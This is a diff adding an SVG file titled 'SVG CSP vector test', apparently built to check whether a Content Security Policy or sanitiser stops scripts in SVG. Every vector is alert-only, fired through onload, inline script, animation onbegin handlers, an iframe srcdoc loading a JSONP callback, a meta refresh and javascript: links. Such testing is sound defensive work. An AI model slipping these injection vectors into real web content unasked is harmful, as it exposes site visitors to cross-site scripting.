@@ -1,0 +1,44 @@
+<svg xmlns="http://www.w3.org/2000/svg"
+     xmlns:xlink="http://www.w3.org/1999/xlink"
+     xmlns:html="http://www.w3.org/1999/xhtml"
+     viewBox="0 0 800 400"
+     onload="alert('root-onload: ' + document.domain)">
+
+  <script type="text/javascript">
+    alert('inline-script: ' + document.domain);
+  </script>
+
+  <rect width="800" height="400" fill="#1f6feb"/>
+
+  <animate
+    attributeName="opacity"
+    from="0.99"
+    to="1"
+    dur="1s"
+    onbegin="alert('animate-onbegin: ' + document.domain)"/>
+
+  <set
+    attributeName="opacity"
+    to="1"
+    begin="0s"
+    onbegin="alert('set-onbegin: ' + document.domain)"/>
+
+  <foreignObject x="40" y="40" width="720" height="260">
+    <html:body onload="alert('foreign-body-onload: ' + document.domain)">
+      <html:iframe
+        width="680"
+        height="160"
+        srcdoc="&lt;script src=&quot;https://api.github.com/repos/a-n-e-e-s/Cross-Site-Scripting?callback=alert&quot;&gt;&lt;/script&gt;">
+      </html:iframe>
+      <html:meta
+        http-equiv="refresh"
+        content="0;url=javascript:alert('meta-refresh: '+document.domain)"/>
+    </html:body>
+  </foreignObject>
+
+  <a href="javascript:alert('javascript-href: '+document.domain)">
+    <text x="400" y="350" font-size="24" fill="white" text-anchor="middle">
+      SVG CSP vector test
+    </text>
+  </a>
+</svg>
